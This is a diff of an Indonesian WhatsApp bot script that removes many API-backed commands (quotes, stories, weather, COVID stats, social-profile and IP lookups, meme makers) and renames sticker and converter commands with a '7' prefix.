-                    text: anu.result,
-                    footer: `Random ${command}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'nasihat': {
- 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/katabijak?apikey=${global.apilol}`)
-     let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
-                     {buttonId: `${prefix}copy ${anu.result}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: anu.result,
-                    footer: `By ${global.fake}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-            case 'cerpen': {
- 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${global.apilol}`)
-     let buttons = [
-                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
-                        {buttonId: `${prefix}copy ${anu.result.title}\n\n${anu.result.cerpen}\n\nBy ${anu.result.creator}.`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `*${anu.result.title}*
-
-${anu.result.cerpen}`,
-                    footer: `By ${anu.result.creator}`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'ceritahoror': {
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${global.apilol}`)        
-                let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1},
-                       {buttonId: `${prefix}copy ${anu.result.title}\n\n${anu.result.desc}\n\n${anu.result.story}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: anu.result.thumbnail},
-                    caption: `*〔 ${anu.result.title} 〕*
-
-${anu.result.desc}
-
-${anu.result.story}`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
 //[Informasi MENU]\\ With apikey lol human
-case 'wikipedia': case 'wiki': {
-	if (!text) throw `*Apa yang mau di cari?*\n _Contoh:_ ${prefix + command} wibu`
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${global.apilol}&query=${text}`)
-replay(anu.result)
- }
-break
-            case 'kbbi': {
-            	 if (!text) throw `*Apa yang mau di tanyakan?*\n _Contoh:_ ${prefix + command} sekolah`
- 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${global.apilol}&query=${text}`)
- makn = anu.result
- let result = makn[Math.floor(Math.random() * makn.length)]
- makno = result.makna
- makne = makno[Math.floor(Math.random() * makno.length)]
- let buttons = [
-                     {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `*〔 KBBI ${result.nama} 〕*
 
-${makne.submakna}`,
-                    footer: `Klik NEXT untuk jawaban yang lainnya`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'infogempa': {
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${global.apilol}`)        
-                let buttons = [
-                    {buttonId: `${prefix} menu`, buttonText: {displayText: '</Menu'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: anu.result.map},
-                    caption: `*〔 Info Gempa 〕*
-
-*LOKASI* : ${anu.result.lokasi}
-
-*WAKTU :* ${anu.result.waktu}
-
-*MAGNITUDE* : ${anu.result.magnitude}
-
-*KEDALAMAN* : ${anu.result.kedalaman}
-
-*POTENSI* : ${anu.result.potensi}`,
-                    footer:  `Data berasal dari BMKG`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-case 'jadwaltvnow': case 'jadwaltv': case 'acaratvnow': case 'acaratv': {
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${global.apilol}`)
-	una = anu.result
-	replay(`*〔 Jadwal TV Now 〕*
-
-*Antv*
-${una.antv}
-──────────────
-*G TV*
-${una.gtv}
-──────────────
-*Indosiar*
-${una.indosiar}
-──────────────
-*Metrotv*
-${una.metrotv}
-──────────────
-*Mnctv*
-${una.mnctv}
-──────────────
-*Rcti*
-${una.rcti}
-──────────────
-*Nettv*
-${una.nettv}
-──────────────
-*Tvone*
-${una.tvone}
-──────────────
-*Transtv*
-${una.transtv}
-──────────────
-*Trans7*
-${una.trans7}
-──────────────
-*Sctv*
-${una.sctv}
-──────────────
-*Rtv*
-${una.rtv}
-──────────────
-*Tvri*
-${una.tvri}`)
-}
-break
-case 'cuaca': case 'infocuaca': {
-	if (!text) throw `*Masukan nama kota/kecamatan*\n _Contoh:_ ${prefix + command} Ngawi`
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${text}?apikey=${global.apilol}`)
-	una = anu.result
-replay(`*〔 Cuaca di ${una.tempat} 〕*
-
-*⭔ Cuaca :* ${una.cuaca}
-*⭔ Angin :* ${una.angin}
-*⭔ Description :* ${una.description}
-*⭔ Kelembapan :* ${una.kelembapan}
-*⭔ Suhu :* ${una.suhu}
-*⭔ Udara :* ${una.udara}
-*⭔ Permukaan Laut :* ${una.permukaan_laut}
-*⭔ Longitude :* ${una.longitude}
-*⭔ Latitude :* ${una.latitude}`)
- }
-break
-case 'coronaindo': case 'covidindo': {
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${global.apilol}`)
-	una = anu.result
-replay(`*〔 Info Covid-19 Indonesia 〕*
-
-*⭔ Positif :* ${una.positif}
-*⭔ Meninggal :* ${una.meninggal}
-*⭔ Sembuh :* ${una.sembuh}
-*⭔ Dirawat :* ${una.dirawat}`)
- }
-break
-case 'corona': case 'covid': {
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${global.apilol}`)
-	una = anu.result
-replay(`*〔 Covid-19 Dunia 〕*
-
-*⭔ Positif :* ${una.positif}
-*⭔ Meninggal :* ${una.meninggal}
-*⭔ Sembuh :* ${una.sembuh}
-*⭔ Dirawat :* ${una.dirawat}`)
- }
-break
-case 'jarak': case 'jaraktempuh': case 'jarakkota': {
-	if (!text) throw `*Masukan nama kota1 kota2*\n _Contoh:_ ${prefix + command} banyuwangi malang`
-	tek1 = args[0] 
-	tek2 = args[1] 
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${global.apilol}&kota1=${tek1}&kota2=${tek2}`)
-	una = anu.result
-replay(`*〔 Jarak Tempuh 〕*
-From ${una.from} To ${una.to}
-
-*⭔ Jarak :* ${una.jarak}
-*⭔ Kereta Api :* ${una.kereta_api}
-*⭔ Pesawat :* ${una.pesawat}
-*⭔ Mobil :* ${una.mobil}
-*⭔ Motor :* ${una.motor}
-*⭔ Jalan Kaki :* ${una.jalan_kaki}
-`) }
-break
-case 'beasiswa': case 'infobeasiswa': {
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=${global.apilol}`)
-	let una = anu.result
-	let result = una[Math.floor(Math.random() * una.length)]
-let buttons = [
-                     {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `*〔 Beasiswa Indonesia 〕*
-
-*${result.title}*
-Link: ${result.link}`,
-                    footer: `Klik NEXT untuk hasil yang lainnya`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'brainly': case 'soal': {
-	if (!text) throw `*Masukan soal/pertanyaan*\n _Contoh:_ ${prefix + command} orang yang memiliki kewarganegaraan ganda di sebut`
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=${global.apilol}&query=${text}`)
-	let una = anu.result
-	let result = una[Math.floor(Math.random() * una.length)]
-	let ini = result.answer
-	let hiu = ini[Math.floor(Math.random() * ini.length)]
-	let buttons = [
-                     {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `*〔 Brainly Search 〕*
-
-   *Pertanyaan :*
-_${result.question.content}_
-
-   *Jawaban:*
- ${hiu.content}
-`,
-                    footer: `Klik NEXT untuk hasil yang lainnya`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'jadwalbola': case 'bolajadwal': {
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${global.apilol}`)
-	let una = anu.result
-	let result = una[Math.floor(Math.random() * una.length)]
-	let buttons = [
-                     {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    text: `*〔 Jadwal Bola 〕*
-
-*⭔ Hari :* ${result.hari}
-*⭔ Jam :* ${result.jam}
-*⭔ Event :* ${result.event}
-*⭔ Match :* ${result.match}
-*⭔ TV :* ${result.tv}`,
-                    footer: `Klik NEXT untuk hasil yang lainnya`,
-                    buttons: buttons,
-                    headerType: 2
-                }
-            XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-            break
-case 'chord': {
-	if (!text) throw `*Masukan Judul lagu !*\n _Contoh:_ ${prefix + command} melukis senja`
-	let anu = await fetchJson(`https://api.lolhuman.xyz/api/chord?apikey=${global.apilol}&query=${text}`)
-	reply(`*〔 Chord Lagu ${text}〕*
-	
-*⭔ Title :* ${anu.result.title}
-*⭔ Created :* ${anu.result.created}
-*⭔ Modified :* ${anu.result.modified.username} (${anu.result.modified.first_name} ${anu.result.modified.last_name}
-*⭔ Chord :* ${anu.result.chord}`)
-}
-break
-//[Stalk MENU]\\ With apikey lol human
-       case 'igstalk': case 'stalkig': case 'instastalk': case 'instagramstalk': {
-       	if (!text) throw `*Masukan username Instagram*\n _Contoh:_ ${prefix + command} fleyvin_soft`
-       m.reply(mess.wait)
-       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${text}?apikey=${global.apilol}`)
-           let foto = anu.result.photo_profile
-           let teks = `*〔 Instagram Stalk 〕*
-
-*⭔ Username :* ${anu.result.username}
-*⭔ Fullname :* ${anu.result.fullname}
-*⭔ Jumlah Post :* ${anu.result.posts}
-*⭔ Followers :* ${anu.result.followers}
-*⭔ Following :* ${anu.result.following}
-*⭔ Bio :* ${anu.result.bio}`
-XeonBotInc.sendMessage(m.chat, { image: { url: foto },  caption: teks , contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": "https://youtu.be/imFIX-Wrt3s"}}}, { quoted: m})
-        }
-        break
-        case 'tiktokstalk': case 'stalktiktok': case 'ttstalk': case 'stalktt': {
-       	if (!text) throw `*Masukan username Tiktok*\n _Contoh:_ ${prefix + command} fleyvin_soft`
-       m.reply(mess.wait)
-       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${text}?apikey=${global.apilol}`)
-           let foto = anu.result.user_picture
-           let teks = `*〔 TikTok Stalk 〕*
-
-*⭔ Username :* ${anu.result.username}
-*⭔ Nama :* ${anu.result.nickname}
-*⭔ Jumlah Video :* ${anu.result.video}
-*⭔ Jumlah Like :* ${anu.result.likes}
-*⭔ Followers :* ${anu.result.followers}
-*⭔ Following :* ${anu.result.followings}
-*⭔ Bio :* ${anu.result.bio}`
-                  XeonBotInc.sendMessage(m.chat, { image: { url: foto },  caption: teks , contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": "https://youtu.be/imFIX-Wrt3s"}}}, { quoted: m})
-        }
-break
-        case 'twitterstalk': case 'twitstalk': case 'stalktwitter':  {
-       	if (!text) throw `*Masukan username Twitter*\n _Contoh:_ ${prefix + command} jokowi`
-       m.reply(mess.wait)
-       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${text}?apikey=${global.apilol}`)
-           let foto = anu.result.profile_picture
-           let teks = `*〔 Twitter Stalk 〕*
-
-*⭔ Username :* ${anu.result.name}
-*⭔ Nama :* ${anu.result.screen_name}
-*⭔ Deskripsi :* ${anu.result.description}
-*⭔ Followers :* ${anu.result.followers}
-*⭔ Following :* ${anu.result.following}
-*⭔ Tweet :* ${anu.result.tweet}
-*⭔ Bergabung :* ${anu.result.joined}`
-                  XeonBotInc.sendMessage(m.chat, { image: { url: foto },  caption: teks , contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": "https://youtu.be/imFIX-Wrt3s"}}}, { quoted: m})
-        }
-break
-case 'githubstalk': case 'stalkgithub': {
-       	if (!text) throw `*Masukan username Twitter*\n _Contoh:_ ${prefix + command} fleyvin_soft`
-       m.reply(mess.wait)
-       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/github/${text}?apikey=${global.apilol}`)
-           let foto = anu.result.avatar
-           let teks = `*〔 Github Stalk 〕*
-
-*⭔ Nama :* ${anu.result.name}
-*⭔ Followers :* ${anu.result.followers}
-*⭔ Following :* ${anu.result.following}
-*⭔ Bio :* ${anu.result.bio}
-*⭔ Publik Repo:* ${anu.result.public_repos}
-*⭔ Publik Gist :* ${anu.result.public_gists}
-*⭔ Type :* ${anu.result.type}
-*⭔ Company :* ${anu.result.company}
-*⭔ Location :* ${anu.result.location}
-*⭔ Email :* ${anu.result.email}
-*⭔ Link :* ${anu.result.url}`
-                  XeonBotInc.sendMessage(m.chat, { image: { url: foto },  caption: teks , contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": "https://youtu.be/imFIX-Wrt3s"}}}, { quoted: m})
-        } 
-break
-case 'youtubestalk': case 'ytstalk': {
-       	if (!text) throw `*Masukan Nama channel YouTube*\n _Contoh:_ ${prefix + command} xZrinva`
-       m.reply(mess.wait)
-       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/ytchannel?apikey=${global.apilol}&query=${text}`)
-           let una = anu.result
-           let ini = una[Math.floor(Math.random() * una.length)]
-                   images = ini.channel_picture.high.url
-        let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: images },
-                    caption: `*〔 YouTube Stalk 〕*
-
-*⭔ Nama :* ${ini.channel_name}
-*⭔ Bio :* ${ini.channel_about}
-*⭔ Link :* https://YouTube.com/channel/${ini.channel_id}
-`,
-                    footer: `Klik NEXT Untuk Hasil Lainnya`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-        }
-break
-case 'ip': case 'ipinfo': case 'ipaddress':  {
-       	if (!text) throw `*Masukan Alamat IP*\n _Contoh:_ ${prefix + command} 114.142.169.38`
-       m.reply(mess.wait)
-       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/ipaddress/${text}?apikey=${global.apilol}`)          
-           replay(`*〔 IP Address 〕*
-
-*⭔ IP Address :* ${anu.result.query}
-*⭔ Negara :* ${anu.result.country}
-*⭔ Kode Negara :* ${anu.result.countryCode}
-*⭔ Region :* ${anu.result.regionName}
-*⭔ Region Code :* ${anu.result.region}
-*⭔ Kota :* ${anu.result.city}
-*⭔ Waktu :* ${anu.result.timezone}
-*⭔ Zip :* ${anu.result.zip}
-*⭔ Lat :* ${anu.result.lat}
-*⭔ Lon :* ${anu.result.lon}
-*⭔ Isp :* ${anu.result.isp}
-*⭔ Org :* ${anu.result.org}
-*⭔ As :* ${anu.result.as}`)               
-        }
-break
-//[MEME MENU]\\ With apikey lol human
-
-case 'memeindo': {                
-                let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${global.apilol}` },
-                    caption: `*〔 Random Image Meme Indo 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-case 'memeglobal': {                
-                let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: `https://api.lolhuman.xyz/api/random/meme?apikey=${global.apilol}` },
-                    caption: `*〔 Random Image Meme Internasional 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-case 'darkjoke': {                
-                let buttons = [
-                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
-                ]
-                let buttonMessage = {
-                    image: { url: `https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${global.apilol}` },
-                    caption: `*〔 Random Image Dark Joke 〕*`,
-                    footer:  `${global.fake}`,
-                    buttons: buttons,
-                    headerType: 4
-                }
-                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
-            }
-          break
-case 'meme1': case 'meme4': case 'meme5':{          
-             if (!text) throw `*Masukan teks*\n _Contoh:_ ${prefix + command} Tahu bacem enak lhoo, jangan lupakan ini `             
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}&text=${text}` }, caption: `Meme maker ${command}` }, { quoted: m })
-            }
-          break
-case 'meme2': case 'meme7': case 'meme8': {        
-             if (!text) throw `*Masukan teks1+teks2*\n _Contoh:_ ${prefix + command} Jumatan bisa+Jumatan dapet nasi kotak`
-              tas = arg.split('+')[0]
-              wah = arg.split('+')[1]
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}&text1=${tas}&text2=${wah}` }, caption: `Meme maker ${command}` }, { quoted: m })
-            }
-          break
-case 'meme3': {          
-             if (!text) throw `*Masukan teks1+teks2+teks3*\n _Contoh:_ ${prefix + command} Aku lewat jalan ramai+Aku lewat jalan sepi+Aku lewat kuburan`
-              tas = arg.split('+')[0]
-              wah = arg.split('+')[1]
-              tri = arg.split('+')[2]
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme3?apikey=${global.apilol}&text1=${tas}&text2=${wah}&text3=${tri}` }, caption: `Meme maker ${command}` }, { quoted: m })
-            }
-          break
-case 'meme6': {          
-             if (!text) throw `*Masukan teks1+teks2+teks3*\n _Contoh:_ ${prefix + command} Tadi mau ngapain+gk tau mo tidur+lu kan belom sholat Isya`
-              tas = arg.split('+')[0]
-              wah = arg.split('+')[1]
-              tri = arg.split('+')[2]
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/meme3?apikey=${global.apilol}&text1=${tas}&text2=${wah}&text3=${tri}` }, caption: `Meme maker 3` }, { quoted: m })
-            }
-          break
-case 'kanna': {          
-             if (!text) throw `*Masukan teks*\n _Contoh:_ ${prefix + command} Tahu bacem enak lhoo, jangan lupakan ini `             
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/creator/kannagen?apikey=${global.apilol}&text=${text}` }, caption: `Meme maker ${command}` }, { quoted: m })
-            }
-          break
-case 'mind': {          
-             if (!text) throw `*Masukan teks*\n _Contoh:_ ${prefix + command} Sembako isinya sampah `             
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/creator/changemymind?apikey=${global.apilol}&text=${text}` }, caption: `Meme maker change my mind` }, { quoted: m })
-            }
-          break
-case 'ohno': {          
-             if (!text) throw `*Masukan teks*\n _Contoh:_ ${prefix + command} Sembako isinya sampah `             
-                XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/creator/changemymind?apikey=${global.apilol}&text=${text}` }, caption: `Meme maker oh no` }, { quoted: m })
-            }
-          break
-case 'smeme': {
-	if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} teks1+teks2*\n_Contoh:_ ${prefix + command} Lihat itu+ada wibu berkeliaran`
-	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
-	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-	let anu = await TelegraPh(media)
-	tas = arg.split('+')[0]
-              wah = arg.split('+')[1]
-                    //uri = api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}
-                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}`) }, caption: `*Reply dengan caption*\n${prefix}s\n*Untuk menjadikan sticker*` }, { quoted: m })      
-               //   XeonBotInc.sendMessage(m.chat, { sticker: { url: api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}`) },caption: ` ${command} ${text}` }, { quoted: m })
-  }
-                           break
-case 'memecreator': {
-	if (!text) throw `*Send/Reply Image dengan Caption ${prefix + command} teks1+teks2*\n_Contoh:_ ${prefix + command} Lihat itu+ada wibu berkeliaran`
-	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command} ${text}`
-	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
-	let anu = await TelegraPh(media)
-	tas = arg.split('+')[0]
-              wah = arg.split('+')[1]
-                    //uri = api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}
-                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/memecreator?apikey=${global.apilol}&text1=${tas}&text2=${wah}&img=${anu}`) }, caption: `*Reply dengan caption*\n${prefix}s\n*Untuk menjadikan sticker*` }, { quoted: m })      
-               //   XeonBotInc.sendMessage(m.chat, { sticker: { url: api('zenz',`/memegen?apikey=${global.apilol}&texttop=${tas}&textbottom=${wah}&img=${anu}`) },caption: ` ${command} ${text}` }, { quoted: m })
-  }
-                           break
 //[STICKER MENU]\\ With apikey lol human
             case 'sticker': case 's': case 'stickergif': case 'sgif': {  
             replay(mess.wait)
@@ -3611,7 +2591,7 @@ case 'memecreator': {
                 }
             }
             break
-case 'harta': {
+case '7harta': {
 	if (!text) throw `*Masukan Teks !*\n_Contoh:_ ${prefix + command} xZrinva`
 	m.reply(mess.wait)
 		let anu = `https://api.lolhuman.xyz/api/hartatahta?apikey=${global.apilol}&text=${text}`
@@ -3621,7 +2601,7 @@ case 'harta': {
                 await fs.unlinkSync(encmedia)
             }
 break           
-case 'hartacustom': {
+case '7hartacustom': {
 	if (!text) throw `*Masukan Teks !*\n_Contoh:_ ${prefix + command} Fazrin
 Ganteng
 Banget
@@ -3634,76 +2614,76 @@ GK BOHONG !`
                 await fs.unlinkSync(encmedia)
             }
 break           
-case 'patrick': {
+case '7patrick': {
 		let anu = `https://api.lolhuman.xyz/api/sticker/patrick?apikey=${global.apilol}`
 		    XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
 break           
-case 'samongus':{
+case '7samongus':{
               let anu = `https://api.lolhuman.xyz/api/sticker/amongus?apikey=${global.apilol}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
   break       
-  case 'gawrgura':{
+  case '7gawrgura':{
               let anu = `https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${global.apilol}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
   break       
-  case 'bucinstick':{
+  case '7bucinstick':{
               let anu = `https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${global.apilol}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
   break       
-case 'attp':{
+case '7attp':{
 	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
               let anu = `https://api.lolhuman.xyz/api/attp?apikey=${global.apilol}&text=${text}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
   break
-case 'attp2':{
+case '7attp2':{
 	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
               let anu = `https://api.lolhuman.xyz/api/attp2?apikey=${global.apilol}&text=${text}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
   break
-case 'ttp':{
+case '7ttp':{
 	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
               let anu = `https://api.lolhuman.xyz/api/ttp?apikey=${global.apilol}&text=${text}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
             break
-case 'ttp2':{
+case '7ttp2':{
 	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
               let anu = `https://api.lolhuman.xyz/api/ttp2?apikey=${global.apilol}&text=${text}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
             break
-case 'ttp3':{
+case '7ttp3':{
 	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
               let anu = `https://api.lolhuman.xyz/api/ttp3?apikey=${global.apilol}&text=${text}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
             break
-case 'ttp4':{
+case '7ttp4':{
 	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
               let anu = `https://api.lolhuman.xyz/api/ttp4?apikey=${global.apilol}&text=${text}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
             break
-case 'ttp5':{
+case '7ttp5':{
 	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
               let anu = `https://api.lolhuman.xyz/api/ttp5?apikey=${global.apilol}&text=${text}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
             break
-case 'ttp6':{
+case '7ttp6':{
 	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
               let anu = `https://api.lolhuman.xyz/api/ttp6?apikey=${global.apilol}&text=${text}`
               XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
             }
             break
 //[convert MENU]\\ With apikey lol human
-case 'topdf': {
+case '7topdf': {
 	if (!text) throw `*Kirim/reply Gambar dengan Caption*  ${prefix + command} judul pdf\n\n_Contoh:_ ${prefix + command} Tugas Biologi`
     m.reply(mess.wait)
  //  https://api.lolhuman.xyz/api/convert2pdf?apikey=fleyvin_soft&filename=LoLHuman.jpg&file=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
@@ -3725,31 +2705,31 @@ case 'topdf': {
             }
             break
 
- case 'tohex': {
+ case '7tohex': {
         	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Aku suka sama kamu`
         	let anu = await fetchJson(`https://api.lolhuman.xyz/api/convert/strtohex?apikey=${global.apilol}&text=${text}`)
 reply(anu.result)
 }
 break
-case 'dhex': {
+case '7dhex': {
         	if (!text) throw `*Masukan kode hex*\n_Contoh:_ ${prefix + command} 7375627320797420785a72696e7661`
         	let anu = await fetchJson(`https://api.lolhuman.xyz/api/convert/hextostr?apikey=${global.apilol}&hex=${text}`)
 reply(anu.result)
 }
 break
-case 'tomorse': {
+case '7tomorse': {
         	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Aku suka sama kamu`
         	let anu = await fetchJson(`https://api.lolhuman.xyz/api/morse/encrypt?apikey=${global.apilol}&text=${text}`)
 reply(anu.result)
 }
 break
-case 'dmorse': {
+case '7dmorse': {
         	if (!text) throw `*Masukan kode morse*\n_Contoh:_ ${prefix + command} -..- --.. .-. .. -. ...- .- `
         	let anu = await fetchJson(`https://api.lolhuman.xyz/api/morse/decrypt?apikey=${global.apilol}&text=${text}`)
 reply(anu.result)
 }
 break
-    case 'tobinary': {
+    case '7tobinary': {
             if (!m.quoted) throw `Reply pesan teks dengan caption ${prefix + command}`
             let { eBinary } = require('./lib/binary')
             let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
@@ -3757,7 +2737,7 @@ break
             m.reply(eb)
         }
         break
